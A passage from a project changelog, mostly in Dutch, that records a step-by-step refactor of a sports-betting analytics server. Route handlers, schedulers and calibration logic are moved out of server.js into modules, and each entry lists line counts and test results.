- Gewijzigd: `lib/integrations/nhl-goalie-preview.js`, `lib/runtime/polling-schedulers.js`, `lib/runtime/check-open-bets.js`, `lib/runtime/operator-actions.js`, `lib/bets-data.js`, `lib/db.js`, `lib/routes/bets-write.js`, `lib/routes/admin-*.js` (6 files), `lib/routes/clv.js`, `server.js`, `index.html`, `test.js`.

## [11.3.22] - 2026-04-18

**Phase 6.4 · learning-loop core**

### Added

- **[claude] `lib/learning-loop.js`** — `updateCalibration` + `revertCalibration` extracted uit server.js (180 regels):
  - `updateCalibration(bet, userId)` — canonieke writer: muteert totalSettled/Wins/Profit, markets[mKey] met multiplier-herberekening (≥8 bets, floor 0.55, cap 1.30), epBuckets met weight-recalibration (≥100 total, ≥15 per bucket, ±0.10 per step), leagues, lossLog, modelLog. Notify bij multiplier-delta ≥0.04 of milestone 10/25/50/100/200.
  - `revertCalibration(bet, userId)` — mirror-decrement met `Math.max(0, n-1)` floors voor outcome-flip scenario's. Multiplier zelf herkalibreert bij volgende update.
- `DEFAULT_EPW` constant ook geexporteerd.
- Admin-only gating: non-admin bets worden geskipt (voorkomt vervuiling van de learning-loop).
- Deps: loadCalib, saveCalib, getUsersCache, notify, getUserMoneySettings. Factory met fail-fast dep-validation.
- Mount na notify-declaratie (line 1354) om TDZ-error op `notify` te vermijden.

### Changed

- server.js netto **-178 regels** (7974 → 7796).
- Totaal shrinkage sinds v11.0.0 baseline: **-4741 regels** (12537 → 7796, −38%).
- `DEFAULT_EPW` const weg uit server.js (was dead na extractie).

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging — zelfde multiplier-formules (0.55/1.30 bounds, 0.70 floor + wr-linear), zelfde epBuckets update (0.85 + ratio·0.15 ramp met ±0.10 cap), zelfde milestone-notify cadence, zelfde revert floor-semantics.

## [11.3.21] - 2026-04-18

**Phase 6.3 · bets-data layer**

### Added

- **[claude] `lib/bets-data.js`** — Supabase-bets data-access laag via factory-pattern:
  - `calcStats(bets, startBankroll, unitEur)` — pure stats-aggregatie (W/L/open, ROI, CLV, variance, luck-factor, potentiële dagwinst, per-bet unitAtTime fallback).
  - `readBets(userId, money?)` — projecteert Supabase-rows naar app-vorm, include CLV + sharp-CLV + fixtureId + unitAtTime.
  - `getUserUnitEur(userId)` — thin wrapper om unit te resolven.
  - `writeBet(bet, userId, unitEur?)` — schema-tolerant insert met tier-retry (v10.10.7 → no fixture_id → no unit_at_time legacy).
  - `updateBetOutcome(id, uitkomst, userId)` — update wl + trigger revertCalibration (bij flip) + updateCalibration (bij nieuwe settled).
  - `deleteBet(id, userId)` — user-scoped delete.
- revertCalibration + updateCalibration via dep-inject (blijven in server.js want onderdeel van learning-loop).
- Factory met fail-fast dep-validation.

### Changed

- server.js netto **-166 regels** (8140 → 7974).
- Totaal shrinkage sinds v11.0.0 baseline: **-4563 regels**.

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging — zelfde SELECT-order (bet_id asc), zelfde schema-tier-retry, zelfde calibration revert+apply logica bij outcome-flip, zelfde CLV/variance aggregaties.

## [11.3.20] - 2026-04-18

**Phase 6.2c · scan schedulers (cron)**

### Added

- **[claude] `lib/runtime/scan-schedulers.js`** — 3 scan-scheduling helpers via factory:
  - `scheduleScanAtHour(timeInput)` — één scan per Amsterdam-HH:MM, self-re-arming, mutex-aware (scanRunning), heartbeat-write naar notifications.
  - `scheduleDailyScan()` — loadUsers → admin.settings.scanTimes → array van scheduleScanAtHour handles, gearchiveerd in `userScanTimers[admin.id]` zodat rescheduleUserScans ze kan opruimen.
  - `scheduleDailyResultsCheck()` — 10:00 Amsterdam: checkOpenBetResults + 24h-overzicht + push + cascade naar autoTuneSignals + evaluateKellyAutoStepup + autoTuneSignalsByClv + updateCalibrationMonitor + evaluateActionableTodos (alleen als settled-bets aanwezig).
- `_globalScanTimers` state nu module-scoped in closure.
- `userScanTimers` blijft shared met rescheduleUserScans in server.js (pass by reference).
- `shouldRunPostResultsModelJobs` via direct require uit `lib/runtime/daily-results`.
- Scan-running mutex via getter/setter (scanRunning blijft module-level flag in server.js want ook /api/prematch route gebruikt hem).
- Factory met fail-fast dep-validation.

### Changed

- server.js netto **-195 regels** (8335 → 8140).
- Totaal shrinkage sinds v11.0.0 baseline: **-4397 regels**.
- **Mijlpaal**: ALLE schedulers zijn uit server.js. `grep "^function schedule" server.js` → 0 hits.

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging — zelfde 10:00 Amsterdam trigger, zelfde cron-tick heartbeat-write, zelfde daily-push body, zelfde cascade-order (autoTune → Kelly → CLV-tune → calibration-monitor → todos).

## [11.3.19] - 2026-04-18

**Phase 6.2b · maintenance + health schedulers**

### Added

- **[claude] `lib/runtime/maintenance-schedulers.js`** — 7 schedulers via één factory:
  - `scheduleRetentionCleanup` — 24u sweep over odds_snapshots (>30d) en feature_snapshots (>60d).
  - `scheduleAutotune` — 6u tick CLV-autotune, gate ≥20 nieuwe settled bets per run.
  - `scheduleBookieConcentrationWatcher` — 6u tick bookie-share check (>60% → warn-push, 24u dedup).
  - `scheduleHealthAlerts` — 1u tick CLV-milestones + drift-alerts + soft-drawdown (–15% 7d → warn).
  - `scheduleSignalStatsRefresh` — 24u aggregate per-signal Brier/CLV/PnL/lift, schrijft signal_stats.
  - `scheduleAutoRetraining` — 7d scan: markten met ≥500 pick_candidates gereed voor residual logistic regression training (log-only voorlopig).
  - `checkUnitSizeChange` — boot-time unit-baseline/-wijziging log naar notifications.
- Ook geexporteerd als pure helpers: `computeBookieConcentration` + `writeTrainingExamplesForSettled`.
- Alle state (`_lastClvAlertN`, `_lastDdAlertAt`, `_driftAlertedKeys`, `_driftAlertResetAt`, `_lastBookieConcAlertAt`, `_lastAutotuneAt`, `_lastAutotuneSettledCount`) nu module-scoped in closure.
- Deps inject: supabase, loadCalib, saveCalib, readBets, getAdminUserId, notify, normalizeSport, detectMarket, autoTuneSignalsByClv, loadSignalWeights, getCurrentModelVersionId (getter), getUnitEur (getter).
- Factory met fail-fast dep-validation.

### Changed

- server.js netto **-484 regels** (8820 → 8336).
- Totaal shrinkage sinds v11.0.0 baseline: **-4201 regels**.
- Dead comment-headers opgeruimd (FIXTURE SNAPSHOT POLLING, UNIT SIZE CHANGE LOGGING, CLV HEALTH ALERTS) — secties zijn allemaal naar lib/ verhuisd.

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging — zelfde 24u/6u/1u/7d intervals, zelfde thresholds (25 CLV milestone-step, 30d/60d retention, >60% concentration warn, -15% drawdown soft, ≥500 pick_candidates residual-trigger), zelfde dedup-cooldowns (24u concentration, 14d drift-reset).

## [11.3.18] - 2026-04-18

**Phase 6.2a · polling + heartbeat schedulers**

### Added

- **[claude] `lib/runtime/polling-schedulers.js`** — 4 schedulers via één factory:
  - `scheduleKickoffWindowPolling` — t-6h/1h/15m odds-snapshots per fixture (5 min loop).
  - `scheduleFixtureSnapshotPolling` — 90 min doorlopende odds-snapshots van upcoming fixtures.
  - `scheduleOddsMonitor` — 60 min drift-check over open bets, drift-alerts met persistent dedup in calib.
  - `scheduleScanHeartbeatWatcher` — 14u-silence alert als scheduler stil ligt.
- Deps inject: supabase, afGet, sleep, notify, normalizeSport, getSportApiConfig, loadCalibAsync, saveCalib, readBets, getAdminUserId.
- `_lastHeartbeatAlertAt` state nu module-scoped (was module-level in server.js).
- Factory pattern met fail-fast dep-validation.

### Changed

- server.js netto **-303 regels** (9123 → 8820).
- Totaal shrinkage sinds v11.0.0 baseline: **-3717 regels**.

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging — zelfde intervals, zelfde MAX_CHECKS (15 voor odds, 30 voor snapshot, 80 voor kickoff), zelfde alert-dedup logica, zelfde 14u heartbeat window.

## [11.3.17] - 2026-04-18

**Phase 6.1 · runtime helpers (checkOpenBetResults + live-scan)**

### Added

- **[claude] `lib/runtime/check-open-bets.js`** — `checkOpenBetResults` factory extracted uit server.js (~268 regels). Pipeline: fetch finished+live fixtures over 6 sporten (today+yesterday), match op open bets, roep `resolveBetOutcome` aan, schrijf settled uitkomst, stuur web-push, log moneyline-settles naar early-payout shadow. Deps inject: supabase, readBets, updateBetOutcome, afGet, sendPushToUser.
- **[claude] `lib/scan/run-live.js`** — `runLive` + `getLivePicks` factory extracted (~143 regels). 4 live-scan scenario's (xG-dominantie, Over 2.5 bij hoge xG + weinig goals, Under 2.5 bij lage xG + 0-0 voor rust, ML bij extreme druk). Deps inject: afGet, loadCalib, sleep, notify, buildPickFactory, setLastLivePicks (atomic setter), leagues.
- Beide modules fail-fast dep-validation.

### Changed

- server.js netto **-399 regels** (9522 → 9123).
- Totaal shrinkage sinds v11.0.0 baseline: **-3414 regels**.

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging — zelfde settle-pipeline, zelfde live-scan scenario's, zelfde notify-flow, zelfde push-payloads.

## [11.3.16] - 2026-04-18

**Phase 5.4x · scan SSE streaming routes**

### Added

- **[claude] `lib/routes/scan-stream.js`** — 2 admin-only SSE scan endpoints extracted:
  - `POST /api/prematch` — pre-match scan SSE stream met progress/log-events, runFullScan wrapper, scanRunning mutex, OPERATOR.master_scan_enabled failsafe, preferred-bookies inject via loadUsers.
  - `POST /api/live` — live scan SSE stream, pick-projectie minimal voor UI (match/league/label/odd/prob/units/reason).
- Deps inject via getter/setter voor `scanRunning` (gedeeld met cron scheduler, blijft module-level flag in server.js).
- Factory pattern met fail-fast dep-validation.

### Changed

- server.js netto **-56 regels** (9578 → 9522).
- Totaal shrinkage sinds v11.0.0 baseline: **-3015 regels** via 26 extracted route modules.
- **Mijlpaal**: alle route-handlers zijn nu uit server.js verhuisd. server.js bevat nog alleen app-setup, middleware, helpers (runFullScan/runLive/checkOpenBetResults/...), scheduler/cron en boot-sequence.

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging — zelfde SSE headers, zelfde rate-limits (5/min prematch, 5/10min live), zelfde failsafe-gates.

## [11.3.15] - 2026-04-18

**Phase 5.4w · notifications aggregate alert-feed**

### Added

- **[claude] `lib/routes/notifications-feed.js`** — `GET /api/notifications` extracted:
  - Bankroll +50%/+100% unit-advice alerts.
  - All Sports ($99/mnd) ROI-triggered upgrade aanbeveling.
  - Loss-log pattern-warning (≥3x same market in last 20 bets).
  - Per-market multiplier signals (filter-strenger/vertrouw-meer).
  - Model-update feed (14d window, laatste 3 entries).
  - Tijdgebonden Bet365-limit reminder (19-26 apr window).
  - Supabase free-tier capacity (>250MB warn, >400MB error).
- Deps: supabase, loadCalib, getAdminUserId, getUserMoneySettings, readBets, loadUsers.
- Factory pattern met fail-fast dep-validation.

### Changed

- server.js netto **-96 regels** (9674 → 9578).
- Totaal shrinkage sinds v11.0.0 baseline: **-2955 regels** via 25 extracted route modules.
- Naming disambiguation: `lib/routes/notifications.js` blijft voor inbox CRUD, nieuwe `notifications-feed.js` voor aggregate-feed.

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging — zelfde thresholds, zelfde alert-structuur, zelfde error-response.

## [11.3.14] - 2026-04-18

**Phase 5.4v · debug diagnostic routes**

### Added

- **[claude] `lib/routes/debug.js`** — 2 admin-only diagnostic endpoints extracted:
  - `GET /api/debug/odds?sport=X&date=YYYY-MM-DD&team=Y&wide=1` — raw api-sports odds dump (max 5 matches) voor 3-way detectie + bookie coverage verificatie.
  - `GET /api/debug/wl?all=1` — settled bets data voor bankroll diagnose.
- Deps inject: requireAdmin, normalizeSport, getSportApiConfig, afGet, readBets, calcStats. Factory pattern met fail-fast dep-validation.

### Changed

- server.js netto **-71 regels** (9745 → 9674).
- Totaal shrinkage sinds v11.0.0 baseline: **-2859 regels** via 24 extracted route modules.

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging — zelfde responses, zelfde error-handling (stack niet in response sinds v10.12.1).

## [11.3.13] - 2026-04-18

**Phase 5.4u · admin backfill/rebuild cluster**

### Added

- **[claude] `lib/routes/admin-backfill.js`** — 2 admin long-running utilities extracted:
  - `POST /api/admin/rebuild-calib` — rebuild c.markets/leagues vanaf 0 over admin settled bets, preserve oude multiplier als prior (of reset via `resetMultipliers: true`), cap op 10k bets (DoS-guard), module-scoped mutex voorkomt race met scans.
  - `POST /api/admin/backfill-signals` — retroactief signals vullen voor bets zonder, via fixture_id (+ findGameId fallback) join op pick_candidates met zelfde bookie + odds binnen 3% (of 5% fallback), max 500/call, rate-limit 100ms/bet, module-scoped mutex.
- Deps inject: supabase, requireAdmin, loadCalib, saveCalib, getUsersCache, normalizeSport, detectMarket, computeMarketMultiplier, refreshMarketSampleCounts, findGameId.
- Mutex state leeft nu in het module-scope (was `let _calibRebuildInProgress / _backfillSignalsInProgress` op module-level in server.js) — functionally identiek, schoner geisoleerd.

### Changed

- server.js netto **-164 regels** (9909 → 9745).
- Totaal shrinkage sinds v11.0.0 baseline: **-2788 regels** via 23 extracted route modules.
- Dead comment-header `/api/admin/signal-performance` opgeruimd (was al verhuisd naar admin-signals.js in v11.3.4).

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging — zelfde mutex-semantics, zelfde query caps, zelfde 409-response bij concurrent call.

## [11.3.12] - 2026-04-18

**Phase 5.4t · live scoreboard cluster**

### Added

- **[claude] `lib/routes/live.js`** — 3 live scoreboard endpoints extracted uit server.js:
  - `GET /api/live-poll` — ESPN scoreboard-poll over 13 football leagues (gratis, snelle refresh).
  - `GET /api/live-scores` — api-football + api-basketball + api-hockey + api-baseball + api-american-football + api-handball live/today met dedup, per-sport mappers, v1 live-status normalisatie.
  - `GET /api/live-events/:id` — fixture events (goal/card/sub) + stats + xG-schatting uit Shots on Goal indien api expected_goals ontbreekt.
- Deps: afGet + `leagues` object (football/basketball/hockey/baseball/american-football/handball).
- `isV1LiveStatus` + `shouldIncludeDatedV1Game` direct geimporteerd uit `lib/runtime/live-board` (zelfde bron als server.js).
- Factory pattern met fail-fast dep-validation.

### Changed

- server.js netto **-294 regels** (10203 → 9909).
- Totaal shrinkage sinds v11.0.0 baseline: **-2624 regels** via 22 extracted route modules.
- **Symbolische mijlpaal**: server.js nu onder 10k regels (was 12537 regels bij v11.0.0 start).

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging — zelfde ESPN responses, zelfde api-football dedup, zelfde xG-fallback.

## [11.3.11] - 2026-04-18

**Phase 5.4s · analyze + POTD cluster**

### Added

- **[claude] `lib/routes/analyze.js`** — 2 endpoints extracted uit server.js:
  - `GET /api/potd` — Pick-of-the-Day post generator voor Reddit + X formats, met W/L/P-record + last-5 + current-pick highlight.
  - `POST /api/analyze` — natural-language match lookup (NL/EN), multi-sport fuzzy resolver, preferred-bookie filter met "buiten-prefs" waarschuwing, fallback naar upcoming fixture search over hockey/basketball/baseball/NFL/handball/football.
- Deps inject: rateLimit, requireAdmin, getLastPrematchPicks, getLastLivePicks, loadScanHistoryFromSheets, loadScanHistory, getUserMoneySettings, readBets, loadUsers, afGet, getSportApiConfig.
- teamMatchScore geimporteerd uit lib/model-math.js binnen de module (geen duplicaat in server.js).
- Factory pattern met fail-fast dep-validation.

### Changed

- server.js netto **-373 regels** (10576 → 10203).
- Totaal shrinkage sinds v11.0.0 baseline: **-2330 regels** via 21 extracted route modules.
- Dead require opgeruimd: `safePick/safePicksList/PUBLIC_PICK_FIELDS` werden sinds v11.2.8 al niet meer gebruikt in server.js; POTD/analyze gebruiken inline `projectPick`.
- Comment-docstring bij picks-mount bijgewerkt (verwijst nu naar analyze.js).

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging — zelfde regex-parser, zelfde market detection, zelfde filter/fallback flow.

## [11.3.10] - 2026-04-18

**Phase 5.4r · bets-write cluster (POST/PUT/recalculate/current-odds)**

### Added

- **[claude] `lib/routes/bets-write.js`** — 4 bets write-endpoints extracted uit server.js:
  - `POST /api/bets` — nieuwe bet + datum-fix (late-night kickoff), pre-kickoff + CLV scheduling, correlation-warning op zelfde wedstrijd.
  - `PUT /api/bets/:id` — outcome/odds/units/sport/tip update, automatische wl-herberekening als odds/units wijzigen op settled bet, updateBetOutcome bij uitkomst-change.
  - `POST /api/bets/recalculate` — admin bulk wl-recompute over settled bets.
  - `GET /api/bets/:id/current-odds` — preferred-bookie odds refresh + drift (delta/direction/implied), respecteert settled-state.
- Factory deps: supabase, rateLimit, requireAdmin, readBets, writeBet, updateBetOutcome, getUserUnitEur, loadUsers, calcStats, defaults, schedulePreKickoffCheck, scheduleCLVCheck, afGet, marketKeyFromBetMarkt. Fail-fast dep-validation.
- Comment-docstring op `lib/routes/bets.js` bijgewerkt (verwijst nu naar bets-write.js voor de write-endpoints).

### Changed

- server.js netto **-223 regels** (10799 → 10576).
- Totaal shrinkage sinds v11.0.0 baseline: **-1957 regels** via 20 extracted route modules.

### Tests

609 passed · 0 failed. Lift-and-shift — geen gedragswijziging, zelfde responses, zelfde validatie-regels, zelfde rate-limits.

## [11.3.9] - 2026-04-18

**Phase 5.4q · admin model-eval cluster (walkforward + training-examples-build + drift + why-this-pick)**

### Added

- **[claude] `lib/routes/admin-model-eval.js`** — 4 model/calibration/attribution endpoints:
  - `GET /api/admin/v2/walkforward?sport=X&days=30` — Brier score + log-loss + calibration buckets over settled bets (impliciete prob uit logged odds als baseline tot pick_candidates ≥500 per markt).
  - `POST /api/admin/v2/training-examples-build` — schrijf training_examples rows voor settled bets.
  - `GET /api/admin/v2/drift` — windowed CLV drift (25/50/100 vs all-time) per markt/signaal/bookie; alert alleen bij ≥10 in window én ≥30 totaal.
  - `GET /api/admin/v2/why-this-pick?bet_id=X` — attribution: baseline/delta/signals/features/consensus + execution-quality replay uit snapshots (point-in-time anchor).
- Deps inject: supabase, requireAdmin, loadUsers, normalizeSport, detectMarket, normalizeBookmaker, summarizeExecutionQuality, writeTrainingExamplesForSettled.
- Factory pattern met fail-fast dep-validation.

### Changed

- server.js netto **-241 regels** (11044 → 10803).
- Totaal shrinkage sinds v11.0.0 baseline: **-1734 regels** via 19 extracted route modules.
- Opgeruimd: dubbele blanks + overbodige comment-fragment tussen admin-sources en admin-signals mounts.

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging.

## [11.3.8] - 2026-04-18

**Phase 5.4p · admin-timeline cluster (calibration-monitor + line-timeline-preview)**

### Added

- **[claude] `lib/routes/admin-timeline.js`** — 2 admin line-timeline/calibration observability endpoints:
  - `GET /api/admin/v2/calibration-monitor?window=90d&sport=X&market_type=Y` — signal_calibration Brier/log-loss/bins per window; graceful degrade als tabel niet gemigreerd.
  - `GET /api/admin/v2/line-timeline-preview?fixture_id=X&market_type=Y&selection_key=Z&line=2.5&two_way=1` — timeline + derived execution-gate metrics + what applyExecutionGate zou doen met hk=0.05 (observability voor price-memory pipeline).
- Deps inject: supabase, requireAdmin, loadUsers, lineTimelineLib. execution-gate lazy-required binnen handler.

### Changed

- server.js netto **-117 regels** (11161 → 11044).
- Totaal shrinkage sinds v11.0.0 baseline: **-1493 regels** via 18 extracted route modules.

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging.

## [11.3.7] - 2026-04-18

**Phase 5.4o · admin-quality cluster (execution/data quality + odds-drift + per-bookie + market-thresholds)**

### Added

- **[claude] `lib/routes/admin-quality.js`** — 5 admin observability/analytics endpoints:
  - `GET /api/admin/v2/execution-quality` — punt-in-tijd execution analyse per fixture × markt × selection (via `summarizeExecutionQuality`).
  - `GET /api/admin/v2/data-quality?hours=24` — feature_snapshots freshness + issue-counts + consensus-health.
  - `GET /api/admin/odds-drift?days=14&scope=mine|all` — odds drift per (sport, market_type, hours-before-kick) bucket; research tool voor entry-timing.
  - `GET /api/admin/v2/per-bookie-stats` — ROI + CLV + win-rate per bookmaker uit settled bets (executable edge).
  - `GET /api/admin/v2/market-thresholds` — huidige adaptive MIN_EDGE per markt tier (BOOTSTRAP/PROVEN/EARLY/UNPROVEN).
- Deps inject: supabase, requireAdmin, loadUsers, summarizeExecutionQuality, normalizeSport, getMarketSampleCache (getter), refreshMarketSampleCounts, MARKET_SAMPLE_TTL_MS, BOOTSTRAP_MIN_TOTAL_BETS.
- Factory pattern met fail-fast dep-validation.

### Changed

- server.js netto **-296 regels** (11457 → 11161).
- Totaal shrinkage sinds v11.0.0 baseline: **-1376 regels** via 17 extracted route modules.

### Tests

609 passed · 0 failed. Lift-and-shift zonder gedragswijziging; bestaande summarizeExecutionQuality + market-thresholds tests dekken de kernlogica.

## [11.3.6] - 2026-04-18

**Phase 5.4n · admin-sources cluster (scrape-diagnose + scrape-sources GET/POST)**

### Added

- **[claude] `lib/routes/admin-sources.js`** — 3 admin data-source operator endpoints:
  - `GET /api/admin/v2/scrape-diagnose?name=X` — live probe één externe bron met HTTP detail-error via safeFetch returnDetails.
  - `GET /api/admin/v2/scrape-sources` — health + breaker-state + enabled-flag voor alle scrape-bronnen.
  - `POST /api/admin/v2/scrape-sources` — enable/disable source runtime + reset-breaker; persist naar calib zodat toggle deploys overleeft.
- Deps inject: requireAdmin, operator (OPERATOR shared state), loadCalib, saveCalib. scraper-base / data-aggregator lazy-required in-module (self-contained lib modules).

### Changed

- server.js netto **-81 regels** (11538 → 11457).
- Totaal shrinkage sinds v11.0.0 baseline: **-1080 regels** via 16 extracted route modules.

### Tests

609 passed · 0 failed. Lift-and-shift; bestaande scraper-base tests dekken de logica.

## [11.3.5] - 2026-04-18

**Phase 5.4m · admin-inspect cluster (bookie-concentration / stake-regime / early-payout-summary / pick-candidates-summary / clv-stats)**

### Added

- **[claude] `lib/routes/admin-inspect.js`** — 5 admin-read endpoints voor observability/analytics:
  - `GET /api/admin/v2/bookie-concentration?days=7` — per-bookie stake-share window (soft-book closure-risico spotten).
  - `GET /api/admin/v2/stake-regime` — preview van unified stake-regime decision op live bets (`computeBankrollMetrics` + `evaluateStakeRegime`), real-bankroll anchor.
  - `GET /api/admin/v2/early-payout-summary?days=30` — shadow-mode aggregaten uit `early_payout_log`; combinatie-key (bookie, sport, market) met `readyForPromotion` flag (≥50 samples).
  - `GET /api/admin/v2/pick-candidates-summary?hours=24` — totaal/accepted/rejected + byReason + byBookie + recentRejected top 10.
  - `GET /api/admin/v2/clv-stats?days=30` — CLV-first KPI per sport + per (sport, markt) bucket; kill-switch eligibility (n≥30 + avg CLV < -2% → WATCHLIST, < -5% → AUTO_DISABLE).
- Deps inject: supabase, requireAdmin, computeBookieConcentration, getActiveStartBankroll (live getter), aggregateEarlyPayoutStats, normalizeSport, detectMarket.
- Factory pattern met fail-fast dep-validation.

### Changed

- server.js netto **-226 regels** (11764 → 11538).
- Totaal shrinkage sinds v11.0.0 baseline: **-999 regels** via 15 extracted route modules.

### Tests

609 passed · 0 failed. Geen nieuwe tests in deze stap — endpoints lift-and-shift zonder gedragswijziging; bestaande stake-regime + early-payout tests dekken de logica.

## [11.3.4] - 2026-04-18

**Phase 5.4l · admin-signals cluster (signal-performance × 2 + model-feed)**

### Added

- **[claude] `lib/routes/admin-signals.js`** — 3 admin-read endpoints:
  - `GET /api/admin/v2/signal-performance` — persisted signal_stats tabel.
  - `GET /api/admin/signal-performance` — live analytics: per signal name → n / avgClv / shrunkExcessClv / posClvRate + status (auto_promotable / logging_positive / logging / active / mute_candidate).
  - `GET /api/model-feed` — calibratie-feed voor admin UI: modelLog + signal weights + market-multipliers + ep-buckets + aggregate perSport.
- Deps inject: supabase, loadCalib, loadSignalWeights, summarizeSignalMetrics, parseBetSignals, normalizeSport, detectMarket.
- 2 nieuwe tests.

### Changed

- server.js netto **-76 regels** (11840 → 11764).
- Totaal shrinkage sinds v11.0.0 baseline: **-773 regels** via 14 extracted route modules.

### Tests

609 passed · 0 failed.

## [11.3.3] - 2026-04-18

**Phase 5.4k · admin snapshot/tuning utilities**

### Added

- **[claude] `lib/routes/admin-snapshots.js`** — 2 admin utilities:
  - `POST /api/admin/v2/autotune-clv` — trigger handmatige CLV-based signal weight tuning.
  - `GET /api/admin/v2/snapshot-counts?hours=24` — total + recent row-count per v2 snapshot tabel (fixtures, odds_snapshots, feature_snapshots, market_consensus, model_runs, pick_candidates). Health-check of de snapshot-polling functioneert.
- 2 nieuwe tests.

### Changed

- server.js netto **-25 regels** (11865 → 11840).
- Totaal shrinkage sinds v11.0.0 baseline: **-697 regels** via 13 extracted route modules.

### Tests

607 passed · 0 failed.

## [11.3.2] - 2026-04-18

**Phase 5.4j · server.js extraction · admin-controls cluster (kill-switch, operator, upgrade-ack)**

### Added

- **[claude] `lib/routes/admin-controls.js`** — 5 admin endpoints in één cluster:
  - `GET /api/admin/v2/kill-switch` — huidige state (enabled, activeKills, thresholds).
  - `POST /api/admin/v2/kill-switch` — toggle enabled, manual add/remove keys, refresh.
  - `POST /api/admin/v2/upgrade-ack` — dismiss `upgrade_api` / `upgrade_unit` aanbevelingen.
  - `GET /api/admin/v2/operator` — OPERATOR failsafe-state + kill-switch count.
  - `POST /api/admin/v2/operator` — toggle failsafe-flags (master_scan_enabled, panic_mode, max_picks_per_day, etc.).
- Shared state (KILL_SWITCH object + OPERATOR object) expliciet inject als deps ipv direct module-state access. Makes mocking testable.
- 2 nieuwe tests.

### Changed

- server.js netto **-48 regels** (11913 → 11865).
- Totaal shrinkage sinds v11.0.0 (12537 baseline): **-672 regels** via 12 extracted route modules.

### Tests

605 passed · 0 failed.

## [11.3.1] - 2026-04-18

**Phase 5.4i · server.js extraction · admin-observability routes**

### Added

- **[claude] `lib/routes/admin-observability.js`** — 2 admin-only endpoints:
  - `GET /api/admin/supabase-usage` — pg_database_size_bytes + row counts per tabel, % free-tier gebruik.
  - `GET /api/admin/scheduler-status` — admin scanTimes + nextFire per slot + activeTimers count. Gebruikt getUserScanTimers getter (ipv directe module-state access).
- 2 nieuwe tests.

### Changed

- server.js netto **-68 regels** (11981 → 11913).
- Totaal shrinkage sinds v11.0.0 (12537 baseline): **-624 regels** via 11 extracted route modules.

### Tests

603 passed · 0 failed.

## [11.3.0] - 2026-04-18

**Phase 5.4h · server.js extraction · analytics routes + server.js onder 12k**

Minor-bump (11.2.x → 11.3.0) voor cumulatieve Phase 5 milestone: server.js nu onder 12k regels voor het eerst sinds baseline.

### Added

- **[claude] `lib/routes/analytics.js`** — 2 admin-only endpoints:
  - `GET /api/signal-analysis` — per-signaal hit-rate + avg CLV edge over settled bets met signals. Parseert `signal_name:+1.2%` format.
  - `GET /api/timing-analysis` — CLV per timing bucket (Vroeg >12h, Medium 3-12h, Laat <3h voor kickoff). Berekent bet logging-tijd vs kickoff (fallback 20:45 default).
- Deps: requireAdmin, readBets. Clean isolatie.
- 2 nieuwe tests: missing-deps + route-mount wire-check.

### Changed

- server.js netto **-79 regels** (12060 → **11981** — eerste keer onder 12k sinds baseline).
- Totaal shrinkage sinds v11.0.0 (12537 baseline): **-556 regels** via 10 extracted route modules (notifications, clv, auth, user, tracker, admin-users, bets, info+status, picks, analytics).

### Tests

601 passed · 0 failed.

## [11.2.9] - 2026-04-18

**Phase 5.4g · server.js extraction · /api/status naar info-router**

### Added

- **[claude] `/api/status` toegevoegd aan `lib/routes/info.js`** — uptime + services breakdown (api-football rate-limit per sport, ESPN, Supabase, WebPush, Render, MLB Stats, NHL public, Open-Meteo) + model stats + stake-regime + leagues per sport. Mount alleen als status-specifieke deps geleverd (afRateLimit, sportRateLimits, getCurrentStakeRegime, leagues); anders alleen /api/version + /api/changelog.
- Deps inject: afKey, afRateLimit, sportRateLimits, getCurrentStakeRegime (getter voor live state), leagues object met arrays per sport.

### Changed

- server.js netto **-43 regels** (12103 → 12060).
- Totaal shrinkage sinds v11.0.0 (12537 baseline): **-477 regels** via 9 extracted route modules.

### Tests

599 passed · 0 failed.

## [11.2.8] - 2026-04-18

**Phase 5.4f · server.js extraction · picks-read routes + shared safePick helpers**

### Added

- **[claude] `lib/routes/picks.js`** — 2 endpoints:
  - `GET /api/picks` — huidige prematch + live picks (in-memory state via getters)
  - `GET /api/scan-history` — laatste N scans uit scan_history tabel
- Pure helpers `safePick(p, isAdmin)` + `safePicksList(picks, isAdmin)` + `PUBLIC_PICK_FIELDS` geëxporteerd als standalone (voor hergebruik in /api/potd + /api/analyze die nog in server.js staan).
- server.js importeert nu `safePick/safePicksList` uit lib/routes/picks (geen duplicaat). DRY win voor security-sensitive projectie.
- 4 nieuwe tests: router missing-deps + wire-check, safePick admin vs non-admin.

### Changed

- server.js netto **-36 regels** (12139 → 12103).
- Totaal shrinkage sinds v11.0.0 (12537 baseline): **-434 regels** via 9 extracted route modules.

### NIET in scope
- `/api/potd` (complex record-lookup uit bets-history) en `/api/analyze` (natural-language team/market parser) blijven in server.js tot dedicated sprint. Ze gebruiken nu de geëxporteerde helpers.

### Tests

599 passed · 0 failed.

## [11.2.7] - 2026-04-18

**Phase 5.4e · server.js extraction · info/meta routes**

### Added

- **[claude] `lib/routes/info.js`** — 2 endpoints:
  - `GET /api/version` — APP_VERSION + laatste 10 modelLog entries
  - `GET /api/changelog` (admin) — parse CHANGELOG.md → JSON entries met ### sections
- Deps: appVersion, loadCalib, requireAdmin, optional changelogPath (default ../../CHANGELOG.md).
- 2 nieuwe tests.

### Changed

- server.js netto **-31 regels** (12170 → 12139).
- Totaal shrinkage sinds v11.0.0 (12537 baseline): **-398 regels** via 8 extracted route modules.

### Tests

595 passed · 0 failed.

## [11.2.6] - 2026-04-18

**Phase 5.4d · server.js extraction · bets read + delete routes**

### Added

- **[claude] `lib/routes/bets.js`** — 3 endpoints:
  - `GET /api/bets` — lijst + stats (admin ?all=true voor cross-user)
  - `GET /api/bets/correlations` — groep open bets op wedstrijd, totalExposure + warning
  - `DELETE /api/bets/:id` — user-scoped delete, rate-limited
- Deps: readBets, deleteBet, loadUsers, calcStats, rateLimit, defaultStartBankroll, defaultUnitEur.
